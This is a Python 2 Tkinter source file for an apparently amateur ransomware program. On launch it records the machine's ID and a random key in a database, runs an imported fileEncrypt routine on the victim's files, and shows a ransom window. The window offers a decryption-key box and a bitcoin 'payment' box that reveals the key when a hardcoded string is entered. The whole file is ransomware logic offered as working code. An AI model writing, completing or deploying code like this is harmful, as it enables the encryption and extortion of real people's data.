from Tkinter import *
from backend.db import *
from ciphers.encrypt.allEncrypt import fileEncrypt
from ciphers.decrypt.allDecrypt import fileDecrypt
from util.utils import (getRandomKey,
                        getUID)

##key = getRandomKey()
##fileEncrypt(key)
##fileDecrypt(key)
root=Tk()

uid = getUID()
key = getRandomKey()
userKey = checkKey(uid)

if checkUser(uid) is 'yes':
    print 'Already attacked'
else:
    insertToDB(uid, key, 0)
    print key
    fileEncrypt(key)

def retrieve_input():
    inputValue = textBox.get("1.0","end-1c")
    if inputValue == str(userKey):
        lblText.set('fixed')
        fileDecrypt(int(userKey))
    else:
        lblText.set('try again')

def retrieve_input2():
    inputValue = textBox2.get("1.0", "end-1c")
    if inputValue == 'df6ds7fg7dfghagf7fga8gfdghad7g':
        lblText2.set('Payment made. Decryption key is: ' + userKey)
    else:
        lblText2.set('Try again')

decryptHeading = Label(root, text = 'Decryption - Enter key below:')
decryptHeading.pack()
textBox=Text(root, height=3, width=50)
textBox.pack()
buttonCommit=Button(root, height=1, width=10, text="Decrypt",
                    command=lambda: retrieve_input())
#command=lambda: retrieve_input() >>> just means do this when i press the button
buttonCommit.pack()
lblText = StringVar()
lbl = Label(root, textvariable = lblText).pack()

paymentHeading = Label(root, text = 'Pay here and recieve key to decrypt. Enter bitcoin address below:')
paymentHeading.pack()
textBox2=Text(root, height=3, width=50)
textBox2.pack()
buttonCommit2=Button(root, height=1, width=10, text="Pay",
                    command=lambda: retrieve_input2())
#command=lambda: retrieve_input() >>> just means do this when i press the button
buttonCommit2.pack()
lblText2 = StringVar()
lbl2 = Label(root, textvariable = lblText2).pack()

mainloop()